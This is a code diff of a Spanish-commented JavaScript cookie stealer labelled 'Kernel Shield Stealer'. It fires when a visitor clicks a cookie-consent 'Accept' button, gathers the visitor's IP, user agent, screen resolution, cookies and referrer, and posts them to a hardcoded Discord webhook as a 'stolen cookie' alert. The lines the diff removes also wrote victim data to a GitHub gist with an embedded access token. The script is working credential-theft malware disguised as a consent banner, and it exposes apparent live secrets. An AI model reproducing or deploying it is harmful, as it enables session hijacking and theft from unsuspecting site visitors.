@@ -1,11 +1,9 @@
-// CONFIGURACIÓN
-const GITHUB_TOKEN = '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'; // Pon aquí tu token de GitHub
-// --- CONFIGURACIÓN ---
-const GIST_ID = '20dfc8e1d104baea808f9964ee1a0c77';
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/https://discord.com/api/webhooks/1556612161101373560/1L8YmVpZcSKSDVxPAWIzQYdM7rPjpo114xqghJbgsPaXhGt5wsEtDDXBa_Y7o9LJuMfZ'; 
 
+// Función para obtener IP del usuario (usando un servicio público permitido por tu CSP o similar)
 async function getIP() {
     try {
+        // Usamos ipify.org, asegúrate de que esté en tu CSP o usa uno alternativo como api.ip.sb
         const res = await fetch('https://api.ipify.org?format=json');
         return (await res.json()).ip;
     } catch (e) {
@@ -13,72 +11,39 @@ async function getIP() {
     }
 }
 
+// Función para enviar a Discord
 async function sendToDiscord(data) {
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "TU_ID_AQUI") return;
+
     const payload = {
         embeds: [{
             title: "🍪 Nueva Cookie Robada",
-            color: 0x673DE6,
+            color: 0x673DE6, // Tu color morado
             fields: [
                 { name: "🌐 IP", value: data.ip || "N/A" },
                 { name: "💻 Navegador/SO", value: data.userAgent || "N/A" },
                 { name: "📺 Resolución", value: data.screenRes || "N/A" },
                 { name: "🔑 Cookies", value: data.cookies ? data.cookies.substring(0, 500) + (data.cookies.length > 500 ? "..." : "") : "N/A" },
-                { name: "🕒 Hora", value: new Date().toLocaleString() }
+                { name: "🕒 Hora", value: new Date().toLocaleString() },
+                { name: "🔗 Referrer", value: data.referrer || "Directo" }
             ],
             footer: { text: "Kernel Shield Stealer" },
             timestamp: new Date().toISOString()
         }]
     };
 
-    // Asegúrate de que tu Webhook esté configurado
-    if (window.DISCORD_WEBHOOK_URL) {
-        fetch(window.DISCORD_WEBHOOK_URL, {
+    try {
+        await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
+    } catch (e) {
+        console.error("Error enviando a Discord:", e);
     }
 }
 
-async function updateGist(data) {
-    const url = `https://api.github.com/gists/${GIST_ID}`;
-    
-    // Obtenemos el contenido actual del gist
-    let currentContent = "";
-    try {
-        const res = await fetch(url);
-        if (res.ok) {
-            const json = await res.json();
-            // Buscamos el archivo principal (normalmente 'filename.txt')
-            const files = json.files;
-            for (let file in files) {
-                currentContent = files[file].content;
-                break; 
-            }
-        }
-    } catch(e) {}
-
-    // Añadimos la nueva línea
-    const newData = `[${new Date().toISOString()}] IP: ${data.ip} | UA: ${data.userAgent} | Cookies: ${data.cookies}\n`;
-    const fullContent = currentContent + newData;
-
-    // Actualizamos el gist
-    await fetch(url, {
-        method: 'PATCH',
-        headers: {
-            'Authorization': `token ${GITHUB_TOKEN}`,
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            files: {
-                "victims.txt": { // El nombre debe coincidir con el que creaste en el Gist
-                    content: fullContent
-                }
-            }
-        })
-    });
-}
-
+// Función principal
 async function stealAndNotify() {
     const ip = await getIP();
     const userData = {
@@ -90,12 +55,16 @@ async function stealAndNotify() {
         referrer: document.referrer
     };
 
-    Promise.all([
-        sendToDiscord(userData),
-        updateGist(userData)
-    ]);
+    // Enviamos a Discord
+    sendToDiscord(userData);
+    
+    // Opcional: Guardar en localStorage como respaldo local
+    let logs = JSON.parse(localStorage.getItem('ks_logs') || '[]');
+    logs.push(userData);
+    localStorage.setItem('ks_logs', JSON.stringify(logs));
 }
 
+// Detectar clic en "Aceptar"
 document.addEventListener('DOMContentLoaded', () => {
     const btn = document.getElementById('cookieAccept');
     if(btn) {
